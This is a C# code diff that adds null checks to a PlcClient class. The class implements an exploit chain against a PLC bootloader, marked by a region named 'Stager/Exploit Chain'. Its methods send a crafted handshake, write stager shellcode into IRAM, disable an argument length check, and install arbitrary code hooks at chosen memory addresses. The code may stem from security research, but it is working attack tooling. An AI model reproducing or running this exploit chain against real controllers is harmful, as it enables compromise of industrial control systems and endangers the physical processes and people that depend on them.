@@ -11,8 +11,8 @@ namespace S7.Net
 {
     public class PlcClient
     {
-        private TcpClient _client;
-        private PlcProtocol _protocol;
+        private TcpClient? _client;
+        private PlcProtocol? _protocol;
         private readonly Action<string> _log;
 
         public PlcClient(Action<string> logger)
@@ -49,8 +49,9 @@ namespace S7.Net
             _log("Disconnected from PLC proxy.");
         }
 
-        public async Task<byte[]> InvokePrimaryHandler(byte handlerIndex, byte[] args, bool awaitResponse = true)
+        public async Task<byte[]?> InvokePrimaryHandler(byte handlerIndex, byte[] args, bool awaitResponse = true)
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             var payload = new byte[1 + args.Length];
             payload[0] = handlerIndex;
             Array.Copy(args, 0, payload, 1, args.Length);
@@ -61,6 +62,7 @@ namespace S7.Net
         #region Stager/Exploit Chain
         public async Task<bool> PerformHandshakeAsync()
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             _log("Starting handshake...");
             byte[] magic = Encoding.ASCII.GetBytes("MFGT1");
             byte[] padding = Encoding.ASCII.GetBytes("AAAA");
@@ -89,8 +91,10 @@ namespace S7.Net
 
         public async Task<string> GetVersion()
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             _log("Getting bootloader version...");
             var response = await InvokePrimaryHandler(0, Array.Empty<byte>());
+            if (response is null) throw new Exception("Failed to get version.");
             string version = $"v{response[2]}.{response[3]}.{response[4]}";
             _log($"Got version: {version}");
             return version;
@@ -141,6 +145,7 @@ namespace S7.Net
 
         public async Task WriteToIram(uint targetAddress, byte[] contents)
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             _log($"Writing {contents.Length} bytes to IRAM at 0x{targetAddress:X8}");
             await EnterSubprotocol(PlcConstants.SUBPROT_80_MODE_IRAM);
 
@@ -160,6 +165,7 @@ namespace S7.Net
 
         public async Task InstallStager(byte[] stagerPayload)
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             _log("Starting stager installation...");
             // 1. Write stager shellcode to its location in IRAM
             await WriteToIram(PlcConstants.IRAM_STAGER_START, stagerPayload);
@@ -204,6 +210,7 @@ namespace S7.Net
 
         public async Task SendFullMsgViaStager(byte[] msg)
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             int maxChunkSize = PlcConstants.MAX_MSG_LEN - 1;
             for (int i = 0; i < msg.Length; i += maxChunkSize)
             {
@@ -227,8 +234,9 @@ namespace S7.Net
             await _protocol.ReceivePacketAsync();
         }
 
-        public async Task<byte[]> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true)
+        public async Task<byte[]?> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true)
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             if (hookNo < 0 || hookNo > 0x20)
                 throw new ArgumentOutOfRangeException(nameof(hookNo));
 
@@ -241,6 +249,7 @@ namespace S7.Net
 
         public async Task WriteViaStager(uint address, byte[] contents)
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             var addressBytes = new byte[]
             {
                 (byte)(address >> 24),
@@ -254,6 +263,7 @@ namespace S7.Net
 
         public async Task InstallAddHookViaStager(uint targetAddress, byte[] payload, int newHookNo)
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             // Set up function pointer and disable arbitrary argument length check
             var hookEntry = new byte[8];
             hookEntry[3] = 0xff; // Variable length
@@ -269,6 +279,7 @@ namespace S7.Net
 
         public async Task<byte[]> ReceiveMany(IProgress<long> progress, int timeoutMs = 5000)
         {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
             using (var ms = new MemoryStream())
             {
                 while (true)
